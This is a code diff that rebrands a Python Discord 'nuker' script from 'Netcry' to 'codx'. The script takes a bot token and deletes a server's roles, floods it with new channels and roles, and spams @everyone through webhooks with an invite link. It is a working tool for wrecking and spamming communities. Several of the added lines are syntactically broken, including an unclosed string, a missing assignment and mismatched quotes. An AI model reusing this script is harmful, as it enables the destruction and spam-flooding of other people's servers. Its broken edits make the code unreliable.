@@ -21,10 +21,10 @@ print("This will only work with bot tokens")
 guild_id = input("Guild ID? ")
 themessage = input("Enter message [Enter for default]: ")
 if themessage == "":
-    themessage = "@everyone\n**Netcry was here** \n\nhttps://github.com/dropalways/netcry-nuker"
-sname = input("Enter new server name [Enter for default]: ")
+    themessage = "@everyone\n**codx was here https://discord.gg/r5fPVakywE** 
+    ("Enter new server name [Enter for default]: ")
 if sname == "":
-    sname = "github.com/dropalways/netcry-nuker"
+    sname = "codx was here"
 num_channels = 50
 num_messages = 41
 num_roles = 40
@@ -78,7 +78,7 @@ async def delete_all_roles(session):
 
 async def create_roles(session):
     print("Creating roles...")
-    rname = "Netcry on top"
+    rname = "Codx was here"
     create_role_url = f'https://discord.com/api/v9/guilds/{guild_id}/roles'
     create_role_payload = {
         'name': f'{rname}',
@@ -128,12 +128,12 @@ async def create_channels_and_spam(session):
     }
     create_channel_url = f'https://discord.com/api/v9/guilds/{guild_id}/channels'
     create_channel_payload = {
-        'name': 'netcry-on-top',
+        'name': "codx-was-here',
         'type': 0
     }
     create_webhook_url = f'https://discord.com/api/v9/channels/{{channel_id}}/webhooks'
     create_webhook_payload = {
-        'name': 'why are you looking at the webhook name | github.com/dropalways/netcry-nuker',
+        'name': 'codx',
     }
 
     create_tasks = []
@@ -166,7 +166,7 @@ async def spam_webhook(session, webhook_url):
 
     message = {
         "content": f"{themessage}",
-        'username': 'github.com/dropalways/netcry-nuker',
+        'username':  'https://discord.gg/r5fPVakywE',
         "avatar_url": "https://cdn.discordapp.com/emojis/1130231841073414294.gif?size=44&quality=lossless",
         "components": [
             {
@@ -175,8 +175,8 @@ async def spam_webhook(session, webhook_url):
                     {
                         "type": 2,
                         "style": 5,
-                        "label": "Download",
-                        "url": "https://github.com/dropalways/netcry-nuker"
+                        "label": "codx",
+                        "url": "https://discord.gg/r5fPVakywE"
                     }
                 ]
             }
